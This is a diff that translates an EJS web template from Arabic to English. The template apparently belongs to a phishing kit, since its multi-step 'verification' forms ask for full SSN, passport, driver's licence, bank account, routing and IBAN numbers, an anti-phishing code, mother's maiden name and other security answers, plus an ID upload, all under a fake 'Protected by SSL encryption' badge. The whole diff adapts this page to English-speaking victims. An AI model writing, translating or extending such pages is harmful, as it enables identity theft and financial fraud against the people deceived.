@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -468,7 +468,7 @@ textarea{resize:vertical;min-height:80px}
     <input type="hidden" name="_step" value="<%= pageContent.slug %>">
 
     <% if (pageContent.form_type === 'id_verify') { %>
-      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي (SSN)', ssn_last4:'آخر 4 أرقام من SSN', card_last4:'آخر 4 أرقام من البطاقة', address:'العنوان', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', state:'الولاية', zip:'الرمز البريدي', dl_number:'رقم رخصة القيادة', phone:'رقم الجوال', email:'البريد الإلكتروني', account_number:'رقم الحساب', routing_number:'رقم التوجيه', iban:'رقم IBAN', booking_ref:'رقم الحجز', last_name:'اسم العائلة' } %>
+      <% const fldLabels = { full_name:'Full Name', dob:'Date of Birth', id_number:'ID Number', ssn:'Social Security Number (SSN)', ssn_last4:'Last 4 digits of SSN', card_last4:'Last 4 digits of card', address:'Street Address', passport_number:'Passport Number', nationality:'Nationality', city:'City', state:'State', zip:'ZIP Code', dl_number:'Driver\'s License Number', phone:'Phone Number', email:'Email Address', account_number:'Account Number', routing_number:'Routing Number', iban:'IBAN', booking_ref:'Booking Reference', last_name:'Last Name' } %>
       <% (pageContent.fields || []).forEach(f => { %>
         <div class="field-group">
           <label><%= fldLabels[f] || f %></label>
@@ -479,28 +479,28 @@ textarea{resize:vertical;min-height:80px}
       <% if ((pageContent.fields || []).length === 0 || pageContent.upload_doc) { %>
         <div class="upload-area" onclick="document.getElementById('docfile').click()">
           <div class="icon">📷</div>
-          <p>انقر لرفع صورة هويتك</p>
-          <p style="font-size:.78rem;margin-top:4px;opacity:.4">JPG، PNG، PDF — حتى 10MB</p>
+          <p>Click to upload your ID document</p>
+          <p style="font-size:.78rem;margin-top:4px;opacity:.4">JPG, PNG, PDF — up to 10MB</p>
         </div>
-        <input type="file" id="docfile" name="doc_file" accept="image/*,.pdf" style="display:none" onchange="document.querySelector('.upload-area p').textContent=this.files[0]?.name||'اختر ملف'">
+        <input type="file" id="docfile" name="doc_file" accept="image/*,.pdf" style="display:none" onchange="document.querySelector('.upload-area p').textContent=this.files[0]?.name||'Select file'">
       <% } %>
 
     <% } else if (pageContent.form_type === 'security_q') { %>
       <div class="field-group">
-        <label>ما هو اسم مدرستك الابتدائية؟</label>
+        <label>What was the name of your elementary school?</label>
         <input type="text" name="answer1" required>
       </div>
       <div class="field-group">
-        <label>ما هو اسم والدتك قبل الزواج؟</label>
+        <label>What is your mother's maiden name?</label>
         <input type="text" name="answer2" required>
       </div>
       <div class="field-group">
-        <label>ما هو اسم حيوانك الأليف الأول؟</label>
+        <label>What was the name of your first pet?</label>
         <input type="text" name="answer3" required>
       </div>
 
     <% } else { %>
-      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي (SSN)', ssn_last4:'آخر 4 أرقام من SSN', card_last4:'آخر 4 أرقام من البطاقة', address:'العنوان', phone:'رقم الجوال', email:'البريد الإلكتروني', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', state:'الولاية', zip:'الرمز البريدي', dl_number:'رقم رخصة القيادة', account_number:'رقم الحساب', routing_number:'رقم التوجيه', iban:'رقم IBAN', booking_ref:'رقم الحجز', last_name:'اسم العائلة', anti_phishing_code:'رمز مكافحة التصيد' } %>
+      <% const fldLabels = { full_name:'Full Name', dob:'Date of Birth', id_number:'ID Number', ssn:'Social Security Number (SSN)', ssn_last4:'Last 4 digits of SSN', card_last4:'Last 4 digits of card', address:'Street Address', phone:'Phone Number', email:'Email Address', passport_number:'Passport Number', nationality:'Nationality', city:'City', state:'State', zip:'ZIP Code', dl_number:'Driver\'s License Number', account_number:'Account Number', routing_number:'Routing Number', iban:'IBAN', booking_ref:'Booking Reference', last_name:'Last Name', anti_phishing_code:'Anti-Phishing Code' } %>
       <% (pageContent.fields || []).forEach(f => { %>
         <div class="field-group">
           <label><%= fldLabels[f] || f %></label>
@@ -509,9 +509,9 @@ textarea{resize:vertical;min-height:80px}
       <% }) %>
     <% } %>
 
-    <button type="submit" class="btn"><%= pageContent.cta || 'متابعة' %></button>
+    <button type="submit" class="btn"><%= pageContent.cta || 'Continue' %></button>
   </form>
-  <p class="secure">🔒 محمي بتشفير SSL</p>
+  <p class="secure">🔒 Protected by SSL encryption</p>
 </div>
 <script>
 document.querySelector('form').addEventListener('submit', function(e) {
@@ -520,7 +520,7 @@ document.querySelector('form').addEventListener('submit', function(e) {
     if (!inp.value.trim()) {
       e.preventDefault();
       document.getElementById('err').style.display='block';
-      document.getElementById('err').textContent='يرجى ملء جميع الحقول';
+      document.getElementById('err').textContent='Please fill in all required fields';
       inp.focus(); return;
     }
   }
